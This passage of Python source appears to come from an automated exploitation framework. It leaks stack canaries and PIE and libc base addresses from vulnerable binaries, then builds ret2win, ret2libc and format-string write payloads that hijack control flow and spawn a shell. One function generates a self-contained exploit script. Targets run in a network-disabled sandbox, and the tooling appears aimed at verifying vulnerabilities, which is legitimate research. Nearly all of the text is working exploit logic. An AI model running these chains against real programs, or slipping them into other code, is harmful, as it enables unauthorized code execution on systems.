                s1 = pre + q(pop_rdi) + q(puts_got) + q(puts_plt) + q(ret_to)
                try:
                    p.stdin.write(s1)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = burst.split(b"\n", 1)[0][:6]
                if len(raw) < 6:
                    continue
                base = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"), puts_off)
                if not base:
                    continue
                # re-entered loop: satisfy the intermediate read, then stage 2 (system)
                try:
                    p.stdin.write(feed)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                _read_until(p, time.time() + 0.4)
                s2 = bytearray(pre)
                if align:
                    s2 += q(align)
                s2 += q(pop_rdi) + q(base + binsh_off) + q(base + system_off)
                try:
                    p.stdin.write(bytes(s2))
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(markers.command + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                       # wrong parity
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if markers.proves(out):
                    return {"ok": True, "canary": canary, "base": base,
                            "system": base + system_off, "align": align,
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                           # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                               # noqa: BLE001
                    pass
    return {"ok": False, "reason": "canary leaked but the ret2libc chain did not spawn a shell "
                                   "(offsets/leak slot?)"}


def _replay_over_read(p, sel, *, leak_recipe, canary_trigger, canary_index, canary_regex,
                      target_bytes, libc_data, timeout):
    """Drive a leak in ONE already-spawned process and recover (canary, pie_base, libc_base, pos).

    Either a SINGLE trigger (an ungated %p dump / over-read) or a RECIPE -- the multi-step input the
    interaction model found to reach a leak behind a typed prompt sequence. A recipe is replayed with
    the stall-based drain (menu._drain: read until the program blocks on the NEXT read) so the FULL
    over-read dump is captured; a quiet-based read truncates it and base corroboration then fails. The
    process is left OPEN, blocked on the read that follows the leak -- the overflow site.

    `pos` is the self-derived overflow distance from the printed fill run to the canary slot: a RAW
    over-read carries the full 8-byte canary word (its byte offset is the distance); a printf("%s")
    over-read TRUNCATES at the canary's NUL low byte, so the 7 non-NUL bytes follow the run and the
    run LENGTH is the distance. `libc_base` is recovered via classify_leak when libc_data is given
    (a deep RAW over-read can spill a libc return address alongside the image pointers)."""
    import re as _re
    import struct as _struct

    from ..fuzz import menu as _menu
    from . import exploit as _exploit
    from . import rop
    rx = _re.compile(canary_regex.encode("latin-1"))
    dump = b""
    try:
        if leak_recipe:
            for step in leak_recipe:                     # drain the prompt, then answer it
                o, _alive = _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + max(0.5, timeout / 3))
                dump += o.encode("latin1") if isinstance(o, str) else (o or b"")
                p.stdin.write(step if isinstance(step, (bytes, bytearray)) else bytes(step))
                p.stdin.flush()
            o, _a = _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + timeout)  # the leak output
            dump += o.encode("latin1") if isinstance(o, str) else (o or b"")
        else:
            p.stdin.write(canary_trigger)
            p.stdin.flush()
            dump += _read_until(p, time.time() + timeout / 2)
    except (BrokenPipeError, OSError):
        return None, None, None, None
    vals = [int(m.group(0), 16) for m in rx.finditer(dump) if _allint(m.group(0))]
    vals += _le_pointer_words(dump)
    cvals = list(vals) + _le_canary_words(dump)
    canary = (cvals[canary_index] if canary_index is not None
              and -len(cvals) <= canary_index < len(cvals) else rop.find_canary(cvals))
    pos = None
    if leak_recipe:
        fill = bytes(leak_recipe[-1]).rstrip(b"\n")
        m = _re.search(_re.escape(fill[:16]) + rb"+", dump) if fill else None
        if m:
            if canary is not None:                       # raw: locate the full canary word
                at = dump.find(_struct.pack("<Q", canary))
                if at >= m.start():
                    pos = at - m.start()
            tail = dump[m.end(): m.end() + 16]           # %s-truncated reconstruction
            if pos is None and len(tail) >= 7 and all(b != 0 for b in tail[:7]) and \
                    sum(1 for b in tail[:7] if 0x20 <= b < 0x7f) <= 2:
                canary = int.from_bytes(b"\x00" + tail[:7], "little")
                pos = m.end() - m.start()
            for i in range(len(tail) - 5):
                if tail[i + 5] in (0x7F, 0x55, 0x56):
                    vals.append(int.from_bytes(tail[i:i + 6], "little"))
    pie_base = _exploit.recover_pie_base(vals, target_bytes)
    libc_base = None
    if libc_data:
        try:
            libc_base = classify_leak(vals, target_bytes, libc_data).get("libc_base")
        except Exception:                                # noqa: BLE001
            libc_base = None
    return canary, pie_base, libc_base, pos


def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, ret_offset=None,
                       win_off, target_bytes, leak_recipe=None, canary_index=None,
                       canary_regex: str = r"0x[0-9a-fA-F]+", loop_feed: bytes | None = None, base_argv=(),
                       marker: bytes = b"LYKOS-PCW-9931", timeout: float = 8.0,
                       mem_mb: int = 2048, pie: bool = True) -> dict:
    """ret2win on a stack-canary target with an in-binary win (a function that spawns a shell /
    prints the flag), WITHOUT any ROP gadget -- the overflow just writes the leaked canary back and
    redirects the saved return to the win. This is the gadget-free L3 a modern small binary (no
    `pop rdi; ret` since glibc dropped __libc_csu_init) can still reach past a canary.

    The canary is random per process, so it is leaked IN THE SAME PROCESS as the overflow:
    `canary_trigger` discloses it (a format `%p` dump, or a `printf("%s", buf)` over-read that runs
    into the canary), and `rop.find_canary` picks it. `build_canary_prefix` writes it back so
    __stack_chk_fail is never reached, then the return is set to the win.

    `pie=True` (default): the image is also ASLR'd, so the PIE base is leaked from the SAME dump
    (>=2 corroborating image pointers via `exploit.recover_pie_base`) and the win is `win_off +
    pie_base`. `pie=False` (no-PIE): the image is at a fixed address, so NO base leak is needed --
    `win_off` is the absolute win address and only the canary is leaked. Confirmed by a spawned
    shell EVALUATING the forgery-proof `attribution` marker (an echo cannot satisfy it). Returns {ok, canary, pie_base,
    win} or {ok: False, reason}."""
    import struct as _struct

    from . import attribution, rop
    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
    markers = attribution.make_code_markers()
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]

    def _leak(p, sel):
        canary, pie_base, _libc, pos = _replay_over_read(
            p, sel, leak_recipe=leak_recipe, canary_trigger=canary_trigger,
            canary_index=canary_index, canary_regex=canary_regex, target_bytes=target_bytes,
            libc_data=b"", timeout=timeout)
        return canary, pie_base, pos

    # A PIE target with a relative loader must run with the sandbox cwd in its staged dir.
    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
    # Residue sweep: a preceding numeric/line prompt leaves its delimiter in the pipe, and a fill
    # longer than a fixed-size read spills the excess -- bytes the OVERFLOW read then swallows BEFORE
    # our payload, shifting every frame field. We cannot drain the kernel pipe from the writer, and
    # the leak + overflow must share ONE process (both bases are per-process), so we re-leak per skew
    # and shift the canary/return offsets back by `skew` until the frame lands. skew=0 is the clean
    # (residue-free) case and is tried first.
    for skew in (0, 1, 2, 3, 4):
        for align in (False, True):                              # optional ret-slide for alignment
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
                                         chdir=(exedir if rel else "")) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                import selectors as _selectors
                sel = _selectors.DefaultSelector()
                sel.register(p.stdout, _selectors.EVENT_READ)
                if not leak_recipe:
                    _read_until(p, time.time() + 0.5)        # consume the opening banner (single-trigger)
                canary, pie_base, pos = _leak(p, sel)
                if canary is None or (pie and not pie_base):
                    continue                                     # need the canary (+ base when PIE)
                base = pie_base if pie else 0                    # no-PIE: win_off is absolute
                # offsets: analyst/caller value wins; else self-derive from the over-read -- the
                # canary sits `pos` bytes into the overflow, the return another 16 past it (the
                # standard [buf][canary][saved rbp][return] frame).
                co = canary_offset if canary_offset is not None else pos
                ro = ret_offset if ret_offset is not None else ((pos + 16) if pos is not None else None)
                if co is None or ro is None:
                    continue
                co -= skew                                       # absorb pipe residue shift
                ro -= skew
                if co < 0 or ro < 0:
                    continue
                pre = rop.build_canary_prefix(co, canary, ro)
                payload = bytearray(pre)
                if align:                                        # a lone `ret` to fix 16-byte align
                    r = rop.find_gadget(target_bytes, "ret")
                    if r:
                        payload += q(base + r)
                payload += q(base + int(win_off))
                try:
                    p.stdin.write(bytes(payload))
                    p.stdin.flush()
                    # re-entered read (if the overflow returns through a loop) then provoke output
                    time.sleep(0.2)
                    if loop_feed:
                        p.stdin.write(loop_feed)      # satisfy the loop's own read first
                    p.stdin.write(markers.command + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                out = _read_until(p, time.time() + timeout, quiet=1.2)
                if markers.proves(out):
                    return {"ok": True, "canary": canary, "pie_base": (pie_base if pie else None),
                            "win": base + int(win_off),
                            # the resolved parameters the live run used, so a bundle can render a
                            # self-contained reproducer that re-leaks and redirects the same way.
                            "repro": {"canary_offset": co, "ret_offset": ro,
                                      "canary_trigger": bytes(canary_trigger), "pie": bool(pie),
                                      "win_off": int(win_off), "canary_index": canary_index,
                                      "canary_regex": canary_regex, "align": bool(align),
                                      "loop_feed": bytes(loop_feed or b"")},
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                           # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                               # noqa: BLE001
                    pass
    return {"ok": False, "reason": (
        "PIE+canary ret2win: leaked the canary but could not corroborate a PIE base from the same "
        "leak, or the redirect did not confirm") if pie else (
        "no-PIE+canary ret2win: could not leak the canary from the trigger, or the redirect to win "
        "did not confirm")}


def render_canary_ret2win_script(*, repro, target_bytes=b"", image_anchors=None) -> bytes:
    """Self-contained reproducer for a gadget-free ret2win PAST A STACK CANARY. The canary is
    per-process random so no static input can exist: the script leaks it (and, when PIE, the image
    base) from the same dump, writes the canary back, and redirects the saved return to the win --
    exactly as `canary_pie_ret2win` confirmed. `repro` is that function's returned parameters.

    No-PIE: `win_off` is the absolute win address. PIE: the win is `base + win_off`, and the base
    is corroborated from `image_anchors` (page_offset -> [image vaddr]) across >=2 leaked slots,
    the same rule as `exploit.recover_pie_base`. Grades itself with an arithmetic challenge a real
    shell evaluates (the win spawns one), printing [+] / [-]."""
    pie = bool(repro.get("pie"))
    # The alignment ret-slide applies on BOTH no-PIE and PIE (system()/do_system needs a 16-byte
    # aligned rsp); its gadget is a static image offset relocated by `base` (0 on no-PIE).
    align_ret = None
    if repro.get("align"):
        from . import rop
        align_ret = rop.find_gadget(target_bytes, "ret") or 0
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 reproducer: gadget-free ret2win past a stack canary. Authorized use only.\n"
        "# RUN IN A SANDBOX/VM -- this executes an untrusted binary and spawns a shell from it.\n"
        "import os, random, re, select, struct, subprocess, sys, time\n"
        "q = lambda v: struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
        f"CANARY_OFF={repro['canary_offset']}; RET_OFF={repro['ret_offset']}; "
        f"WIN_OFF={repro['win_off']:#x}; PIE={pie}\n"
        f"ALIGN_RET={(align_ret or 0):#x}\n"
        f"TRIGGER={bytes(repro['canary_trigger'])!r}; FEED={bytes(repro.get('loop_feed') or b'')!r}\n"
        f"REGEX={repro.get('canary_regex', r'0x[0-9a-fA-F]+')!r}; "
        f"IDX={repro['canary_index'] if repro.get('canary_index') is not None else 'None'}\n"
        f"ANCHORS={(image_anchors or {})!r}\n"
        "def read_until(p, deadline, quiet=0.3):\n"
        "    out, last = b'', time.time()\n"
        "    while time.time() < deadline:\n"
        "        r, _, _ = select.select([p.stdout], [], [], 0.1)\n"
        "        if r:\n"
        "            c = os.read(p.stdout.fileno(), 4096)\n"
        "            if not c: break\n"
        "            out, last = out + c, time.time()\n"
        "        elif p.poll() is not None: break\n"
        "        elif out and time.time() - last > quiet: break\n"
        "    return out\n"
        "def find_canary(vals):\n"                            # low byte 0x00, high entropy, not a ptr
        "    for v in vals:\n"
        "        if v & 0xFF or v >> 8 == 0 or v < 0x1000000000000: continue\n"
        "        if 0x550000000000 <= v <= 0x5FFFFFFFFFFF or 0x7F0000000000 <= v <= 0x7FFFFFFFFFFF:\n"
        "            continue\n"
        "        return v\n"
        "    return None\n"
        "def pie_base(vals):\n"
        "    sup = {}\n"
        "    for v in set(vals):\n"
        "        for va in ANCHORS.get(v & 0xfff, []):\n"
        "            b = v - va\n"
        "            if b > 0 and b % 0x1000 == 0: sup.setdefault(b, set()).add(v)\n"
        "    b = max(sup, key=lambda k: len(sup[k]), default=None)\n"
        "    return b if (b and len(sup[b]) >= 2) else None\n"
        "for _ in range(4):\n"
        "    p = subprocess.Popen([EXE], stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n"
        "                         stderr=subprocess.STDOUT)\n"
        "    read_until(p, time.time() + 0.5)\n"
        "    if TRIGGER: p.stdin.write(TRIGGER); p.stdin.flush()\n"
        "    dump = read_until(p, time.time() + 3)\n"
        "    vals = [int(m.group(0), 16) for m in re.finditer(REGEX.encode(), dump)]\n"
        # a raw over-read leaks the canary as a canary-shaped binary word (not hex); harvest those
        "    cvals = []\n"
        "    for i in range(max(0, len(dump) - 7)):\n"
        "        wb = dump[i:i+8]\n"
        "        if wb[0] != 0 or wb[1] == 0 or sum(1 for x in wb if x) < 5: continue\n"
        "        w = int.from_bytes(wb, 'little')\n"
        "        if not (0x550000000000 <= w <= 0x5FFFFFFFFFFF or 0x7F0000000000 <= w <= 0x7FFFFFFFFFFF):\n"
        "            cvals.append(w)\n"
        "    canary = vals[IDX] if (IDX is not None and -len(vals) <= IDX < len(vals)) else find_canary(vals + cvals)\n"
        "    base = pie_base(vals) if PIE else 0\n"
        "    if canary is None or (PIE and not base): p.kill(); continue\n"
        "    pre = b'A'*CANARY_OFF + q(canary) + b'B'*max(0, RET_OFF - CANARY_OFF - 8)\n"
        "    payload = bytearray(pre)\n"
        "    if ALIGN_RET: payload += q(base + ALIGN_RET)\n"
        "    payload += q(base + WIN_OFF)\n"
        "    try:\n"
        "        p.stdin.write(bytes(payload)); p.stdin.flush(); time.sleep(0.2)\n"
        "        if FEED: p.stdin.write(FEED); p.stdin.flush()\n"
        "        a, b = random.randint(1000, 9999), random.randint(1000, 9999)\n"
        "        p.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (a, b)); p.stdin.flush()\n"
        "    except (BrokenPipeError, OSError): p.kill(); continue\n"
        "    out = read_until(p, time.time() + 6, quiet=1.5)\n"
        "    if (b'LYKOS_SHELL_%d' % (a*b)) in out:\n"
        "        sys.stdout.write(out.decode('latin-1', 'ignore'))\n"
        "        print('\\n[+] canary %#x bypassed, win reached, shell evaluated the challenge' % canary)\n"
        "        sys.exit(0)\n"
        "    p.kill()\n"
        "print('[-] canary ret2win did not confirm'); sys.exit(1)\n"
    ).encode()


def canary_ret2win(exe, workdir, *, win_addr, **kw) -> dict:
    """Gadget-free ret2win past a stack canary on a NO-PIE target: leak the canary, write it back,
    redirect the saved return to the FIXED-address win. Thin wrapper over canary_pie_ret2win with
    pie=False (win_off carries the absolute win address). Same keywords otherwise (canary_trigger,
    canary_offset, ret_offset, target_bytes, canary_index, base_argv, timeout, ...)."""
    return canary_pie_ret2win(exe, workdir, win_off=int(win_addr), pie=False, **kw)


def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read_cap=255,
                   gate_prefix: bytes = b"", loop_exit: bytes = b"q\n", base_argv=(),
                   marker: bytes = b"LYKOS-FMT-9931", timeout: float = 10.0,
                   mem_mb: int = 2048) -> dict:
    """Format-string -> ret2win on a PIE + Full-RELRO target (GOT read-only, so a %n must hit a
    SAVED RETURN on the stack, not a GOT slot). Needs a LOOPING printf(user) sink: iteration 1 does a
    `%N$p` leak, iteration 2 does the `%hhn` write, then the function returns through the overwritten
    slot. A targeted %n to the return does NOT cross the stack canary (no overflow), so this works on
    a canary-protected target too. In ONE process (ASLR forces same-process use):
      leak -- recover the PIE base from the image pointers the dump spills (recover_pie_base), and
              collect the stack-pointer values (frame pointers; a saved return sits at frame_ptr+8);
      write -- fmtstr_payload plants `pie_base + win_off` at a candidate (stack_ptr + delta).
    The exact frame-pointer->return delta is layout-specific, so SWEEP the leaked stack pointers x a
    few deltas and let a spawned-shell marker pick the slot that actually redirects (never guessed
    blindly). Confirmed by a shell EVALUATING the forgery-proof `attribution` marker. Returns
    {ok, pie_base, win, target} or {ok: False, reason}. `gate_prefix` is any bytes that must
    precede the payload to reach the sink.

    The probe must FIT the sink's read size (`read_cap`): too long a `%p` dump spills past the read
    and desyncs the loop. A big input buffer also pushes the saved frame off the low slots, so the
    probe reads a DEEP slot window that starts past the buffer (fmt_offset + buffer-in-slots) where
    the image / frame / libc pointers actually sit. `fmt_offset` (where the payload lands in printf's
    varargs) is calibrated once in a throwaway process -- it is an ASLR-invariant layout constant."""
    import re as _re

    from . import attribution
    from . import exploit as _exploit
    from . import fmt as _fmt
    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
    markers = attribution.make_code_markers()
    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    hexrx = _re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")
    MARK = 0x4141414141414141

    def _spawn():
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
                                     chdir=(exedir if rel else "")) + [str(exe)] + argv
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                preexec_fn=preexec)

    def _dump(p, lo, hi):
        """Send one `%lo$p .. %hi$p` dump (sized under read_cap) and return {slot: value}."""
        body = gate_prefix + b" ".join(b"%%%d$p" % i for i in range(lo, hi + 1)) + b"\n"
        try:
            p.stdin.write(body)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return {}
        out = _read_until(p, time.time() + timeout / 2)
        vals = {}
        for i, tk in enumerate(hexrx.findall(out), lo):
            if tk != b"(nil)":
                try:
                    vals[i] = int(tk, 16)
                except ValueError:
                    pass
        return vals

    # Calibrate fmt_offset once (throwaway process): marker + a short low dump -> the slot whose
    # printed value is the marker is where our buffer lands in printf's varargs.
    if not fmt_offset:
        q = _spawn()
        try:
            _read_until(q, time.time() + 0.5)
            try:
                q.stdin.write(gate_prefix + struct.pack("<Q", MARK) + b"|"
                              + b" ".join(b"%%%d$p" % i for i in range(1, 25)) + b"\n")
                q.stdin.flush()
            except (BrokenPipeError, OSError):
                pass
            fmt_offset = _fmt.find_fmt_offset(_read_until(q, time.time() + timeout / 2), marker=MARK)
        finally:
            _kill(q)
            try:
                q.wait(timeout=2)
            except Exception:                            # noqa: BLE001
                pass
    if not fmt_offset:
        return {"ok": False, "reason": "format-string ret2win: could not calibrate the varargs "
                                       "offset (no reachable printf(user) sink?)"}

    # Deep window: skip the buffer (fmt_offset + buffer-in-slots) and read as many slots as fit the
    # read, so the image / frame / libc pointers past the buffer are captured in ONE read.
    per = 8                                              # bytes per "%NNN$p " directive, ~roomy
    width = max(8, min(40, (read_cap - len(gate_prefix)) // per))
    deep_lo = int(fmt_offset) + (read_cap // 8) + 1

    deltas = (8, 0, 16, -8, 24, -16, 32, 40)
    for cand_idx in range(width):
        for delta in deltas:
            p = _spawn()
            try:
                _read_until(p, time.time() + 0.5)        # banner
                vals = _dump(p, deep_lo, deep_lo + width - 1)   # iteration 1: deep leak
                image = [v for v in vals.values() if 0x550000000000 <= v < 0x600000000000]
                pie_base = _exploit.recover_pie_base(image, target_bytes, allow_single=True)
                if not pie_base:
                    break                                # no image pointer in this window -> stop
                stacks = [v for s, v in sorted(vals.items())
                          if 0x7F0000000000 <= v < 0x800000000000]
                if cand_idx >= len(stacks):
                    break                                # exhausted the leaked stack pointers
                target = stacks[cand_idx] + delta
                win = pie_base + int(win_off)
                try:
                    payload = _fmt.fmtstr_payload(int(fmt_offset), {target: win})
                except ValueError:
                    continue
                if len(gate_prefix) + len(payload) + 1 > read_cap:
                    continue                             # write payload must fit the read too
                try:                                     # iteration 2: the %hhn write
                    p.stdin.write(gate_prefix + payload + b"\n")
                    p.stdin.flush()
                    time.sleep(0.2)
                    # A menu-gated sink LOOPS: after the write the function is back at its prompt, so
                    # the overwritten return has not fired yet. Nudge the loop to RETURN -- a
                    # non-numeric trips the usual `if (scanf(...) != 1) return;` exit -- so control
                    # passes through the overwritten slot. Harmless when the sink already returns.
                    if loop_exit:
                        p.stdin.write(loop_exit)
                        p.stdin.flush()
                        time.sleep(0.2)
                    p.stdin.write(markers.command + b"\n")   # a spawned shell evaluates this
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                out = _read_until(p, time.time() + timeout, quiet=1.2)
                if markers.proves(out):
                    return {"ok": True, "pie_base": pie_base, "win": win, "target": target,
                            "fmt_offset": int(fmt_offset),
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                    # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                        # noqa: BLE001
                    pass
    return {"ok": False, "reason": "format-string ret2win: leaked a PIE base but no (stack ptr, delta) "
                                   "redirected control to win (frame layout? sink not looping?)"}


def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, system_off, binsh_off,
                        leak_recipe=None, canary_trigger=b"", canary_offset=None, ret_offset=None,
                        canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
                        puts_plt_off=None, puts_got_off=None, puts_libc_off=None, ret_to_off=None,
                        ret_gadget_off=None, base_argv=(), marker: bytes = b"LYKOS-PCL-9931",
                        timeout: float = 10.0, mem_mb: int = 2048) -> dict:
    """ret2libc on a PIE + stack-canary target with NO in-binary win -- the gated-leak counterpart of
    canary_pie_ret2win for the common hardened cluster where the only path to a shell is libc.

    The canary AND the PIE base are leaked IN ONE PROCESS by replaying the interaction recipe's
    over-read (_replay_over_read); every overflow carries build_canary_prefix so __stack_chk_fail
    passes. Two routes reach libc:

      one-shot  -- the SAME over-read already spilled a libc pointer (a deep RAW over-read that runs
                   into a __libc_start_* return address): classify_leak hands back libc_base, so a
                   single canary-bypass overflow returns straight to system("/bin/sh").
      two-stage -- no libc in the leak, but the vulnerable read RE-ENTERS (ret_to_off names the loop):
                   a canary-prefixed puts(puts@GOT) relocated by the PIE base prints a libc pointer,
                   the recipe's benign prefix is replayed to re-reach the read, and a second
                   canary-prefixed overflow calls system.

    All *_off are IMAGE offsets (relocated by the recovered PIE base) EXCEPT system_off / binsh_off /
    puts_libc_off, which are offsets in the loading libc. Confirmed by a spawned shell that
    EVALUATES the forgery-proof `attribution` marker. Returns {ok, route, canary, pie_base,
    libc_base, system} or {ok: False, reason}."""
    import selectors as _selectors
    import struct as _struct

    from ..fuzz import menu as _menu
    from . import attribution, rop
    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
    markers = attribution.make_code_markers()
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False

    def _spawn():
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
                                     chdir=(exedir if rel else "")) + [str(exe)] + argv
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                preexec_fn=preexec)

    def _shell_out(p, sel):
        try:
            time.sleep(0.2)
            p.stdin.write(markers.command + b"\n")
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return b""
        return _read_until(p, time.time() + timeout, quiet=1.2)

    last = {"ok": False, "reason": "PIE+canary ret2libc: no shell confirmed"}
    for skew in (0, 1, 2, 3, 4):                                  # absorb stdin residue (see ret2win)
        for align in (False, True):                              # movaps 16-byte alignment for system
            p = _spawn()
            try:
                sel = _selectors.DefaultSelector()
                sel.register(p.stdout, _selectors.EVENT_READ)
                if not leak_recipe:
                    _read_until(p, time.time() + 0.5)            # banner (single-trigger)
                canary, pie_base, libc_base, pos = _replay_over_read(
                    p, sel, leak_recipe=leak_recipe, canary_trigger=canary_trigger,
                    canary_index=canary_index, canary_regex=canary_regex, target_bytes=target_bytes,
                    libc_data=libc_data, timeout=timeout)
                if canary is None or not pie_base:
                    continue
                co = canary_offset if canary_offset is not None else pos
                ro = ret_offset if ret_offset is not None else ((pos + 16) if pos is not None else None)
                if co is None or ro is None:
                    continue
                co -= skew
                ro -= skew
                if co < 0 or ro < 0:
                    continue
                pre = rop.build_canary_prefix(co, canary, ro)
                ag = rop.find_gadget(target_bytes, "ret") if align else None
                align_w = q(pie_base + ag) if ag else b""

                if libc_base:                                    # --- one-shot: libc already leaked
                    payload = bytes(pre) + align_w + q(pie_base + pop_rdi_off) \
                        + q(libc_base + binsh_off) + q(libc_base + system_off)
                    try:
                        p.stdin.write(payload); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    out = _shell_out(p, sel)
                    if markers.proves(out):
                        return {"ok": True, "route": "one-shot", "canary": canary, "pie_base": pie_base,
                                "libc_base": libc_base, "system": libc_base + system_off,
                                "output": out[:400].decode("latin-1", "ignore")}
                    last = {"ok": False, "reason": "one-shot ret2libc did not confirm a shell",
                            "pie_base": pie_base, "libc_base": libc_base}
                    continue

                # --- two-stage: leak libc with a canary-safe puts(GOT), then system on the re-entry
                if None in (puts_plt_off, puts_got_off, puts_libc_off, ret_to_off):
                    last = {"ok": False, "pie_base": pie_base,
                            "reason": "canary+PIE leaked, no libc in the over-read and no loop/puts "
                                      "offsets for a two-stage leak"}
                    continue
                s1 = bytes(pre) + q(pie_base + pop_rdi_off) + q(pie_base + puts_got_off) \
                    + q(pie_base + puts_plt_off) + q(pie_base + ret_to_off)
                try:
                    p.stdin.write(s1); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = burst.split(b"\n", 1)[0][:6]
                if len(raw) < 6:
                    continue
                libc2 = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"),
                                              puts_libc_off)
                if not libc2:
                    last = {"ok": False, "pie_base": pie_base,
                            "reason": "two-stage: PIE base ok but the libc leak was unrecognised"}
                    continue
                # the loop re-runs the prompts: replay the WHOLE recipe (the benign answers AND the
                # leak fill) to land back on the overflow read -- the same navigation the leak used;
                # the re-fired over-read just prints again and is drained.
                if leak_recipe:
                    for step in leak_recipe:
                        _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + max(0.5, timeout / 3))
                        try:
                            p.stdin.write(bytes(step)); p.stdin.flush()
                        except (BrokenPipeError, OSError):
                            break
                    _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + timeout / 3)
                else:
                    try:
                        p.stdin.write(canary_trigger); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    _read_until(p, time.time() + 0.4)
                s2 = bytes(pre) + align_w + q(pie_base + pop_rdi_off) \
                    + q(libc2 + binsh_off) + q(libc2 + system_off)
                try:
                    p.stdin.write(s2); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                out = _shell_out(p, sel)
                if markers.proves(out):
                    return {"ok": True, "route": "two-stage", "canary": canary, "pie_base": pie_base,
                            "libc_base": libc2, "system": libc2 + system_off,
                            "output": out[:400].decode("latin-1", "ignore")}
                last = {"ok": False, "reason": "two-stage ret2libc did not confirm a shell",
                        "pie_base": pie_base, "libc_base": libc2}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                           # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                               # noqa: BLE001
                    pass
    return last


def _allint(b):
    try:
        int(b, 16)
        return True
    except ValueError:
        return False


# The high byte (bits 40-47) of a leaked x86-64 userspace pointer. Classic Linux pinned the PIE
# image at 0x55/0x56 and libc/mmap/stack at 0x7f, and the recogniser hardcoded exactly those. A
# kernel with more mmap entropy spreads BOTH across the whole high half of the 47-bit VA -- measured
# on one such kernel: PIE/heap 0x56-0x64, libc/stack 0x71-0x7f -- so pinning 0x55/0x56/0x7f missed
# ~14 of every 15 real pointers and the leak recovery resolved a base on only one run in several.
# Accept any top byte in [0x10, 0x7f] (top two bytes still zero): that spans every observed layout
# AND classic Linux, rejects small non-pointer words (< 16 TiB), and leaves the chance hits to be
# dropped by the cross-pointer / page-offset corroboration downstream, which is where false pointers
# were always meant to die.
_PTR_HI_MIN, _PTR_HI_MAX = 0x10, 0x7F


def _is_ptr_hi(b: int) -> bool:
